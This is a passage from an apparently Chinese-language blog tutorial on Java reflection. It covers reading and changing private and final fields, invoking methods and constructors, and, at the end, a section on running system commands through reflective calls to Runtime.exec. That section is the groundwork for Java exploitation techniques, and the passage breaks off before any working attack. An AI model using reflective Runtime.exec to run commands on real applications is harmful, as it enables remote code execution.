System.out.println(<span class="string">&quot;2:&quot;</span>);</span><br><span class="line">        Field[] field2 = ctf.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : field2)&#123;</span><br><span class="line">            System.out.println(field.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;3:&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field3</span> <span class="operator">=</span> ctf.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(field3);</span><br><span class="line">        System.out.println(<span class="string">&quot;4:&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field4</span> <span class="operator">=</span> ctf.getDeclaredField(<span class="string">&quot;sex&quot;</span>);</span><br><span class="line">        System.out.println(field4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对于数组类型的需要用for循环遍历输出</span></span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1:</span><br><span class="line">name</span><br><span class="line">2:</span><br><span class="line">name</span><br><span class="line">anay</span><br><span class="line">sex</span><br><span class="line">3:</span><br><span class="line">public java.lang.String Main.name</span><br><span class="line">4:</span><br><span class="line">private java.lang.String Main.sex</span><br></pre></td></tr></table></figure>

<p>先说明一下一个点再来说一下代码输出结果的差别</p>
<p><strong>我们需要注意的是一个<code>Field</code>对象包含了一个字段的所有信息，可以使用如下函数获取</strong></p>
<ul>
<li><code>getName()</code>：返回字段名称</li>
<li><code>getType()</code>：返回字段类型，也是一个Class实例</li>
<li><code>getModifiers()</code>：返回字段修饰符</li>
<li><code>get(obj)</code>：获取字段值</li>
<li><code>set</code>：修改字段值</li>
</ul>
<p>这时再看上面给的代码，就可以知道不使用<code>getName()</code>直接输出就可以获取到变量的修饰符以及类型。</p>
<h4 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h4><p>这里就需要用到<code>get(obj)</code>，直接看代码。</p>
<p>这里将Main.java稍微改改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;fupanc&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">8888</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">sex</span> <span class="operator">=</span> <span class="string">&quot;boy&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;haha,你好&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;haha,you are right&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Text.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; ctf = Class.forName(<span class="string">&quot;Main&quot;</span>);</span><br><span class="line">        Field[] field2 = ctf.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : field2)&#123;</span><br><span class="line">            System.out.println(field.get(ctf.newInstance()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fupanc</span><br><span class="line">8888</span><br><span class="line">Exception in thread &quot;main&quot; java.lang.IllegalAccessException: class Text cannot access a member of class Main with modifiers &quot;private&quot;</span><br></pre></td></tr></table></figure>

<p>**这里可以看到<code>private</code>字段抛出错误，可以调用<code>Field.setAccessible(true)</code>**，更改代码如下：</p>
<p>Text.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; ctf = Class.forName(<span class="string">&quot;Main&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> ctf.getDeclaredField(<span class="string">&quot;sex&quot;</span>);</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>); <span class="comment">//true代表取消java语言访问检查</span></span><br><span class="line">        System.out.println(field2.get(ctf.newInstance()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//成功输出boy</span></span><br></pre></td></tr></table></figure>

<h4 id="修改字段值"><a href="#修改字段值" class="headerlink" title="修改字段值"></a>修改字段值</h4><p>基本格式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> stdClass.getDeclaredField(<span class="string">&quot;grade&quot;</span>);</span><br><span class="line">f.set(obj, <span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>直接给代码看看：<br>Text.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; ctf = Class.forName(<span class="string">&quot;Main&quot;</span>);    </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> ctf.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ctf.newInstance(); <span class="comment">//Main o = new Main();也行</span></span><br><span class="line">        field2.set(o,<span class="string">&quot;haha&quot;</span>);</span><br><span class="line">        System.out.println(field2.get(o));<span class="comment">//输出看看是否被修改</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field3</span> <span class="operator">=</span> ctf.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">i</span> <span class="operator">=</span> ctf.newInstance();</span><br><span class="line">        field3.set(i,<span class="number">12333</span>);</span><br><span class="line">        System.out.println(field3.get(i));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出为haha 12333 ，成功修改，并且可以知道public和protected类型修饰符都不会被限制</span></span><br></pre></td></tr></table></figure>

<p>注意看代码，这里为什么要实例化一个对象赋值给一个变量，而不是像上面获取字段值那样直接用<code>ctf.newInstance()</code>直接来代表<code>obj</code>，可以先自己想想😈，现在给出解释：</p>
<p>看一部分代码，这里调用了两次o，如果我们两个地方都使用<code>ctf.newInstance()</code>，那么就会实例化两次，导致前面修改的对象和输出的对象不一致。所以需要使用一个o来代表这是一个对象，从而输出修改后的结果。不要小看这一个小小的问题哦</p>
<p><strong>对于<code>private修饰</code>的字段修改方法</strong>，同样需要调用<code>Field.setAccessible(true)</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; ctf = Class.forName(<span class="string">&quot;Main&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> ctf.getDeclaredField(<span class="string">&quot;sex&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ctf.newInstance();</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field2.set(o,<span class="string">&quot;haha&quot;</span>);</span><br><span class="line">        System.out.println(field2.get(o));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//成功输出haha ,这里是private类型</span></span><br></pre></td></tr></table></figure>

<h4 id="修改final关键字修饰的成员变量"><a href="#修改final关键字修饰的成员变量" class="headerlink" title="修改final关键字修饰的成员变量"></a>修改final关键字修饰的成员变量</h4><p>按照下面套就行，注意需要导入<code>java.lang.reflect.Modifier</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 反射获取Field类的modifiers</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> field.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置modifiers修改权限</span></span><br><span class="line">modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改成员变量的Field对象的modifiers值</span></span><br><span class="line">modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改成员变量值</span></span><br><span class="line">field.set(类实例对象, 修改后的值);</span><br></pre></td></tr></table></figure>

<p>实例使用如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="comment">// 获取私有的成员变量</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> User.class.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 移除 final 修饰符</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        <span class="comment">// 修改成员变量值</span></span><br><span class="line">        field.set(user, <span class="string">&quot;you can do it&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这样就可以修改User类中的private和final属性的name值</p>
<h3 id="获取类的方法"><a href="#获取类的方法" class="headerlink" title="获取类的方法"></a>获取类的方法</h3><p>想要创建Method需要导包，位于<code>java.lang.reflect.Method</code>下，常使用的方法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method <span class="title function_">getMethod</span><span class="params">(name,Class...)</span>：获取某个<span class="keyword">public</span>的Method（包括父类）</span><br><span class="line">Method <span class="title function_">getDeclaredMethod</span><span class="params">(name,Class...)</span>：获取当前类的某个Method（不包括父类）</span><br><span class="line"><span class="comment">//第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型</span></span><br><span class="line">Method[] getMethods()：获取所有<span class="keyword">public</span>的Method（包括父类）</span><br><span class="line">Method[] getDeclaredMethods()：获取当前类的所有Method（不包括父类）</span><br></pre></td></tr></table></figure>

<p>同样的一个<code>Method</code>对象包含一个方法的所有信息：</p>
<ul>
<li><code>getName()</code>：返回方法名称</li>
<li><code>getReturnType()</code>：返回方法返回值类型，也是一个Class实例</li>
<li><code>getParameterTypes()</code>：返回方法的参数类型，是一个Class数组</li>
<li><code>getModifiers()</code>：返回方法的修饰符</li>
</ul>
<h4 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h4><p>直接给代码看如何利用,为了凸显结果方便理解，这里改一下<code>Main.java</code>的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;fupanc&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">8888</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">sex</span> <span class="operator">=</span> <span class="string">&quot;boy&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;haha,你好&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;haha,you are right&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(String sex)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.sex=sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Text.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; ctf = Class.forName(<span class="string">&quot;Main&quot;</span>);</span><br><span class="line">        <span class="comment">//获取setName()方法</span></span><br><span class="line">        Method method1=ctf.getMethod(<span class="string">&quot;setName&quot;</span>,String.class);<span class="comment">//创建Method需要导包</span></span><br><span class="line">        method1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(method1.getName());</span><br><span class="line">        <span class="comment">//获取setAge()方法</span></span><br><span class="line">        Method method2=ctf.getDeclaredMethod(<span class="string">&quot;setAge&quot;</span>,<span class="type">int</span>.class);</span><br><span class="line">        System.out.println(method2.getName());</span><br><span class="line">        <span class="comment">//获取setSex()方法</span></span><br><span class="line">        Method method3=ctf.getDeclaredMethod(<span class="string">&quot;setSex&quot;</span>,String.class);</span><br><span class="line">        System.out.println(method3.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Output:</span></span><br><span class="line"><span class="comment">setName</span></span><br><span class="line"><span class="comment">setAge</span></span><br><span class="line"><span class="comment">setSex</span></span><br></pre></td></tr></table></figure>

<p>这里需要注意的就是对于不同修饰符修饰的方法再获取时使用的方法的不同。</p>
<h4 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h4><p><code>invoke</code>：调用方法。</p>
<p><code>invoke</code>的作用是执行方法，需要连个参数，第一个参数是：</p>
<ul>
<li>如果这个方法是一个普通方法，那么第一个参数是类对象</li>
<li>如果这个方法是一个静态方法，那么第一个参数是类</li>
</ul>
<p>第二个参数是这个方法的需要传入的参数。</p>
<p><strong>这里需要注意一点</strong>，在调用方法这里与获取成员变量差不多，<code>private修饰符</code>，需要通过<code>Method.setAccessible(true)</code>允许其调用。</p>
<p>先简单给代码看看</p>
<p>Main.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;fupanc&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">8888</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">sex</span> <span class="operator">=</span> <span class="string">&quot;boy&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;haha,你好&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;haha,you are right&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(String sex)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.sex=sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Text.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; ctf = Class.forName(<span class="string">&quot;Main&quot;</span>);</span><br><span class="line">        <span class="comment">//调用setName()方法</span></span><br><span class="line">        Method method1=ctf.getMethod(<span class="string">&quot;setName&quot;</span>,String.class);<span class="comment">//获取方法</span></span><br><span class="line">        System.out.println(method1.getName());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ctf.newInstance();<span class="comment">//实例化一个对象</span></span><br><span class="line">        method1.invoke(o,<span class="string">&quot;haha&quot;</span>);<span class="comment">//调用方法</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">z</span> <span class="operator">=</span> ctf.getField(<span class="string">&quot;name&quot;</span>);<span class="comment">//获取字段</span></span><br><span class="line">        System.out.println(z.get(o));<span class="comment">//获取并输出字段值</span></span><br><span class="line">        <span class="comment">//调用setAge()方法</span></span><br><span class="line">        Method method2=ctf.getDeclaredMethod(<span class="string">&quot;setAge&quot;</span>,<span class="type">int</span>.class);<span class="comment">//获取方法</span></span><br><span class="line">        System.out.println(method1.getName());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">j</span> <span class="operator">=</span> ctf.newInstance();</span><br><span class="line">        method2.invoke(j,<span class="number">12345556</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">z1</span> <span class="operator">=</span> ctf.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        System.out.println(z1.get(j));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Output:</span></span><br><span class="line"><span class="comment">setName</span></span><br><span class="line"><span class="comment">haha</span></span><br><span class="line"><span class="comment">setName</span></span><br><span class="line"><span class="comment">12345556</span></span><br></pre></td></tr></table></figure>

<p>可以看出成功调用了setName&#x2F;setAge方法并设置了name&#x2F;age的值。</p>
<p><strong>对于<code>非public修饰符</code>调用方式</strong>，通过<code>Method.setAccessible(true)</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; ctf = Class.forName(<span class="string">&quot;Main&quot;</span>);</span><br><span class="line">        <span class="comment">//调用setSex()方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method3</span> <span class="operator">=</span> ctf.getDeclaredMethod(<span class="string">&quot;setSex&quot;</span>,String.class);</span><br><span class="line">        System.out.println(method3.getName());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">x</span> <span class="operator">=</span> ctf.newInstance();</span><br><span class="line">        method3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method3.invoke(x,<span class="string">&quot;boyshaha&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">z2</span> <span class="operator">=</span> ctf.getDeclaredField(<span class="string">&quot;sex&quot;</span>);</span><br><span class="line">        z2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(z2.get(x));        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*Output：</span></span><br><span class="line"><span class="comment">setSex</span></span><br><span class="line"><span class="comment">boyshaha</span></span><br></pre></td></tr></table></figure>

<p>这样就可以看出成功调用出了private修饰的<code>setSex()</code>方法</p>
<h3 id="获取构造函数Constructor"><a href="#获取构造函数Constructor" class="headerlink" title="获取构造函数Constructor"></a>获取构造函数Constructor</h3><p>获取构造函数Constructor，位于java.lang.reflect.Constructors中，常使用的方法有：</p>
<ul>
<li>Constructor[] getConstructors()：只返回public构造函数</li>
<li>Constructor[] getDeclaredConstructors()：返回所有构造函数</li>
<li>Constructor getConstructor(Class…)：匹配和参数配型相符合的public构造函数</li>
<li>Constructor getDeclaredConstructor(Class…)：匹配和参数配型相符的构造函数</li>
</ul>
<p>Main.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Main</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Main</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参构造函数&quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Main</span><span class="params">(<span class="type">boolean</span> n)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;私有构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Text.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; ctf = Class.forName(<span class="string">&quot;Main&quot;</span>);</span><br><span class="line">        Constructor[] x = ctf.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor z : x)&#123;</span><br><span class="line">            System.out.println(z);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;——————————————-——————————&quot;</span>);</span><br><span class="line">        System.out.println(ctf.getDeclaredConstructor(<span class="type">boolean</span>.class));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用非public的Constructor时，必须首先通过setAccessible(true)设置允许访问。setAccessible(true)可能会失败。</p>
<h3 id="获取继承关系"><a href="#获取继承关系" class="headerlink" title="获取继承关系"></a>获取继承关系</h3><p>获取父类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class.getSuperclass()</span><br></pre></td></tr></table></figure>

<p>获取interface</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class.getInterface()</span><br></pre></td></tr></table></figure>

<h2 id="反射创建类对象"><a href="#反射创建类对象" class="headerlink" title="反射创建类对象"></a>反射创建类对象</h2><p>其实这个已经在前面代码的示例中已经利用过滤，只要把前面代码看懂这个板块就没有问题。直接给代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">ctf</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;Main&quot;</span>); <span class="comment">// 创建Class对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ctf.newInstance(); <span class="comment">// 创建类对象            </span></span><br></pre></td></tr></table></figure>

<p>则o就是对应的类对象。</p>
<p>这里调用的这个类的无参构造函数，但是不一定可以使用成功，原因可能为：</p>
<ul>
<li>使用的类没有无参构造函数</li>
<li>使用的类构造函数是私有的</li>
</ul>
<p>注意如果没有无参构造方法，可以使用<code>Constructor.newInstance()</code>来实例化一个类对象。如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Main</span><span class="params">(String name)</span>作为构造函数：</span><br><span class="line"> </span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;Main&quot;</span>);   clazz.getMethod(<span class="string">&quot;setName&quot;</span>,String.class).invoke(clazz.getConstructor(String.class).newInstance(<span class="string">&quot;admin&quot;</span>),<span class="string">&quot;haha&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//当没有权限访问时可以调用constructor.setAccessible(true)来创建出类实例</span></span><br></pre></td></tr></table></figure>





<h2 id="利用反射进行命令执行"><a href="#利用反射进行命令执行" class="headerlink" title="利用反射进行命令执行"></a>利用反射进行命令执行</h2><h3 id="利用java-lang-Runtime"><a href="#利用java-lang-Runtime" class="headerlink" title="利用java.lang.Runtime"></a>利用java.lang.Runtime</h3><p>java.lang.Runtime 中有一个exec方法可以执行本地命令，但是不能如下直接构造来执行命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; ctf = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> ctf.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">        method1.invoke(ctf.newInstance(),<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">中间代码可以简化如下，并且不需要导包，需要注意一下：</span></span><br><span class="line"><span class="comment">Class ctf = Class.forName(&quot;java.lang.Runtime&quot;);</span></span><br><span class="line"><span class="comment">ctf.getMethod(&quot;exec&quot;, String.class).invoke(ctf.newInstance(), &quot;id&quot;);    </span></span><br></pre></td></tr></table></figure>

<p>这样会报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.IllegalAccessException: class Text cannot access a member of class java.lang.Runtime (in module java.base) with modifiers &quot;private&quot;</span><br><span class="line">	at java.base/jdk.internal.reflect.Reflection.newIllegalAccessException(Reflection.java:361)</span><br><span class="line">	at java.base/jdk.internal.reflect.Reflection.ensureMemberAccess(Reflection.java:99)</span><br><span class="line">	at java.base/java.lang.Class.newInstance(Class.java:579)</span><br><span class="line">	at Text.main(Text.java:5)</span><br></pre></td></tr></table></figure>

<p>原因就是<code>Runtime</code>类的构造方法是私有的，导致这样<code>ctf.newInstance()</code>直接调用是错误的。</p>
<p>可以看一下源码</p>
